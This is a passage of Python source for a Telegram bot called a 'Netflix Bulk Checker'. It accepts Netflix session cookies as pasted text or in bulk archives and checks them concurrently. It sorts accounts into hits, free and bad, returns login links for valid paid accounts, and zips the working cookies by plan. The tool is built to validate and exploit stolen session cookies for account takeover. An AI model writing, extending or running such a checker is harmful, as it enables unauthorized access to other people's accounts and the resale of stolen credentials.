    async def _send_zip(zip_bytes: bytes, hit_count: int):
        try:
            zip_name = f"{hit_count}xNETFLIX.zip"
            await app.bot.send_document(
                chat_id=chat_id,
                document=io.BytesIO(zip_bytes),
                filename=zip_name,
                caption=(
                    f"✅ *Check Complete!*\n"
                    f"🎯 *{hit_count} Hit(s)* saved inside.\n"
                    f"📂 Organized by plan inside the ZIP.\n\n"
                    f"📣 {CHECKED_BY}"
                ),
                parse_mode="Markdown",
            )
        except Exception as e:
            logger.error("send_zip error: %s", e)

    # ── worker ───────────────────────────────────────────────────────────────
    checked_count = 0
    checked_lock  = threading.Lock()
    hits_collected: list[dict] = []
    hits_lock      = threading.Lock()
    seen_ids: set  = set()   # deduplicate by email or NetflixId
    seen_lock      = threading.Lock()

    def process(cookie_dict):
        nonlocal checked_count
        if stop_event.is_set():
            return

        result = _check_one_cookie(cookie_dict)
        s      = result["status"]

        with _sessions_lock:
            key = "hits" if s == "hit" else s
            counters[key] = counters.get(key, 0) + 1

        with checked_lock:
            checked_count += 1
            local_count = checked_count

        if s == "hit" and result["urls"]:
            info  = result["info"]
            # Deduplicate — use email as unique key, fallback to NetflixId
            dedup_key = (info.get("email") or "").lower().strip() or \
                        (cookie_dict.get("NetflixId") or "")[:32]

            with seen_lock:
                if dedup_key and dedup_key in seen_ids:
                    # Duplicate account — downgrade counter
                    with _sessions_lock:
                        counters["hits"] = max(0, counters.get("hits", 1) - 1)
                        counters["free"] = counters.get("free", 0) + 1
                    return
                if dedup_key:
                    seen_ids.add(dedup_key)

            # Collect for ZIP
            with hits_lock:
                hits_collected.append({
                    "info":       info,
                    "urls":       result["urls"],
                    "cookie_raw": _cookie_dict_to_netscape(cookie_dict),
                })
            # Send hit notification immediately
            _schedule(_send_hit_msg(info, result["urls"]))

        # Refresh status dashboard every UPDATE_EVERY cookies
        if local_count % UPDATE_EVERY == 0 or local_count == counters["total"]:
            _schedule(_edit_status(done=False))

    # ── thread pool ──────────────────────────────────────────────────────────
    from concurrent.futures import ThreadPoolExecutor, as_completed
    with ThreadPoolExecutor(max_workers=NUM_THREADS) as ex:
        future_map = {ex.submit(process, cd): cd for cd in cookies_list}
        for fut in as_completed(future_map):
            if stop_event.is_set():
                break
            try:
                fut.result()
            except Exception:
                pass

    # ── final status update ──────────────────────────────────────────────────
    _schedule(_edit_status(done=True))

    # ── send ZIP of all hits ──────────────────────────────────────────────────
    with hits_lock:
        collected = list(hits_collected)

    if collected:
        zip_bytes = _build_hits_zip(collected)
        if zip_bytes:
            _schedule(_send_zip(zip_bytes, len(collected)))

    with _sessions_lock:
        _sessions.pop(session_id, None)


# ──────────────────────────────────────────────────────────────────────────────
# TELEGRAM HANDLERS
# ──────────────────────────────────────────────────────────────────────────────

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["waiting"] = True

    already_welcomed = context.user_data.get("welcomed", False)
    context.user_data["welcomed"] = True

    caption = (
        "👋 Hey ⫸𝐁𝐄𝐑𝐋𝐈𝐍⫷!\n\n"
        "🎬 Netflix Cookie Checker\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "Send me your Netflix cookies to\n"
        "check accounts & get login links.\n\n"
        "📤 Accepted inputs:\n"
        "• Single cookie text\n"
        "• .txt file\n"
        "• .zip / .rar / .7z archive\n"
        "  (bulk check all .txt files inside)\n\n"
        "📣 @BERLIN_IS_BERLIN"
    )

    if not already_welcomed:
        try:
            with open(BERLIN_IMG, "rb") as f:
                await update.message.reply_photo(photo=f, caption=caption)
        except Exception:
            await update.message.reply_text(caption)
    else:
        await update.message.reply_text("✅ Ready! Send your cookie or archive file.")


async def cmd_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["waiting"] = False
    await update.message.reply_text("❌ Cancelled. /start to begin.")


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 *Commands*\n"
        "/start – Start\n"
        "/cancel – Cancel\n\n"
        "*Accepted formats:*\n"
        "• `NetflixId=abc...`  (text)\n"
        "• Netscape cookie export `.txt`\n"
        "• `.zip` / `.rar` / `.7z` with `.txt` files inside\n\n"
        f"📣 {CHECKED_BY}", parse_mode="Markdown"
    )


async def btn_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle Stop Process button."""
    query = update.callback_query
    await query.answer()
    data = query.data or ""
    if data.startswith("stop_"):
        sid = data[5:]
        with _sessions_lock:
            sess = _sessions.get(sid)
        if sess:
            sess["stop"].set()
            await query.edit_message_text(
                text=query.message.text + "\n\n🛑 *Stopped by user.*",
                parse_mode="Markdown",
                reply_markup=None,
            )
        else:
            await query.answer("Already finished.", show_alert=False)


# ── single cookie (text or .txt) ────────────────────────────────────────────

async def _process_single(raw: str, update: Update, context: ContextTypes.DEFAULT_TYPE):
    cd = extract_cookie_dict(raw)
    nid = cd.get("NetflixId")
    if not nid and re.match(r"^[A-Za-z0-9%._~+/\-&=]{20,}$", raw.strip()):
        nid = raw.strip(); cd["NetflixId"] = nid
    if not nid:
        await update.message.reply_text(
            "❌ No `NetflixId` found.\n\nSend a cookie string or file.\n\n"
            f"📣 {CHECKED_BY}", parse_mode="Markdown"
        )
        return

    proc = await update.message.reply_text("⏳ *Checking…*", parse_mode="Markdown")
    result = _check_one_cookie(cd)
    await proc.delete()

    if result["status"] == "bad":
        await update.message.reply_text(
            "❌ *Bad cookie* — expired or invalid.\n\n"
            f"📣 {CHECKED_BY}", parse_mode="Markdown"
        )
        return

    if result["status"] == "free":
        await update.message.reply_text(
            "🆓 *Free account* — no paid subscription detected.\n\n"
            f"📣 {CHECKED_BY}", parse_mode="Markdown"
        )
        return

    info = result["info"]
    urls = result["urls"]
    context.user_data["waiting"] = False
    await update.message.reply_text(
        format_hit_message(info),
        parse_mode="Markdown",
        reply_markup=hit_keyboard(urls),
    )


# ── bulk check ──────────────────────────────────────────────────────────────

async def _start_bulk(
    cookies_all: list[dict],
    filename: str,
    update: Update,
    context: ContextTypes.DEFAULT_TYPE,
):
    if not cookies_all:
        await update.message.reply_text("❌ No valid cookies found in the file(s).")
        return

    import uuid
    session_id = uuid.uuid4().hex[:12]
    counters   = {"total": len(cookies_all), "hits": 0, "bad": 0, "free": 0}
    stop_event = threading.Event()

    status_msg = await update.message.reply_text(
        status_text(filename, counters, done=False),
        parse_mode="Markdown",
        reply_markup=status_keyboard(session_id, counters, False),
    )

    with _sessions_lock:
        _sessions[session_id] = {
            "stop": stop_event,
            "counters": counters,
            "status_msg_id": status_msg.message_id,
        }

    app     = context.application
    chat_id = update.effective_chat.id
    main_loop = asyncio.get_event_loop()   # capture the running bot loop

    t = threading.Thread(
        target=_run_bulk_check,
        args=(session_id, cookies_all, filename, chat_id, status_msg.message_id, main_loop, app),
        daemon=True,
    )
    t.start()
    context.user_data["waiting"] = False


# ── document handler ─────────────────────────────────────────────────────────

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get("waiting"):
        await update.message.reply_text("Send /start to begin.")
        return

    doc      = update.message.document
    fname    = (doc.file_name or "file").lower()
    mime     = (doc.mime_type or "").lower()

    # Download file
    try:
        fobj = await doc.get_file()
        buf  = io.BytesIO()
        await fobj.download_to_memory(buf)
        raw_bytes = buf.getvalue()
    except Exception as exc:
        logger.error("Download failed: %s", exc)
        await update.message.reply_text("❌ Could not download the file.")
        return

    # ── Archive (bulk) ───────────────────────────────────────────────────────
    is_archive = (
        fname.endswith(".zip") or fname.endswith(".rar") or
        fname.endswith(".7z")  or fname.endswith(".tar.gz") or
        fname.endswith(".tgz") or fname.endswith(".tar.bz2")
    )

    if is_archive:
        proc = await update.message.reply_text("📦 *Extracting archive…*", parse_mode="Markdown")
        try:
            # Run in executor so it doesn't block the async loop
            loop = asyncio.get_event_loop()
            txt_files = await loop.run_in_executor(
                None, extract_txt_from_archive, raw_bytes, fname
            )
        except Exception as exc:
            await proc.delete()
            await update.message.reply_text(f"❌ Archive error: `{exc}`", parse_mode="Markdown")
            return

        if not txt_files:
            await proc.delete()
            await update.message.reply_text("❌ No `.txt` files found inside the archive.")
            return

        all_cookies: list[dict] = []
        for _fn, text in txt_files:
            all_cookies.extend(parse_cookies_from_text(text))

        await proc.delete()
        if not all_cookies:
            await update.message.reply_text("❌ No valid cookies found in archive.")
            return

        await update.message.reply_text(
            f"📦 Found *{len(all_cookies)}* cookie(s) in `{doc.file_name}`. Starting check…",
            parse_mode="Markdown",
        )
        await _start_bulk(all_cookies, doc.file_name or "archive", update, context)
        return

    # ── Single .txt ───────────────────────────────────────────────────────────
    if fname.endswith(".txt") or mime.startswith("text/") or mime == "application/octet-stream":
        raw_text = raw_bytes.decode("utf-8", errors="ignore").strip()
        if not raw_text:
            await update.message.reply_text("❌ File is empty.")
            return

        cookies = parse_cookies_from_text(raw_text)

        if len(cookies) > 1:
            await update.message.reply_text(
                f"📋 Found *{len(cookies)}* cookie(s) in `{doc.file_name}`. Starting bulk check…",
                parse_mode="Markdown",
            )
            await _start_bulk(cookies, doc.file_name or "file.txt", update, context)
        else:
            await _process_single(raw_text, update, context)
        return

    await update.message.reply_text(
        "❌ Unsupported file type.\n"
        "Send `.txt`, `.zip`, `.rar`, or `.7z`.", parse_mode="Markdown"
    )


async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get("waiting"):
        await update.message.reply_text("Send /start to begin.")
        return
    await _process_single(update.message.text.strip(), update, context)


# ──────────────────────────────────────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────────────────────────────────────

def main():
    if not BOT_TOKEN:
        raise RuntimeError("Set TELEGRAM_BOT_TOKEN first.")

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start",  cmd_start))
    app.add_handler(CommandHandler("cancel", cmd_cancel))
    app.add_handler(CommandHandler("help",   cmd_help))
    app.add_handler(CallbackQueryHandler(btn_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    print("=" * 52)
    print("   NETFLIX BULK CHECKER  |  @BERLIN_IS_BERLIN")
    print("=" * 52)
    app.run_polling()


if __name__ == "__main__":
    main()
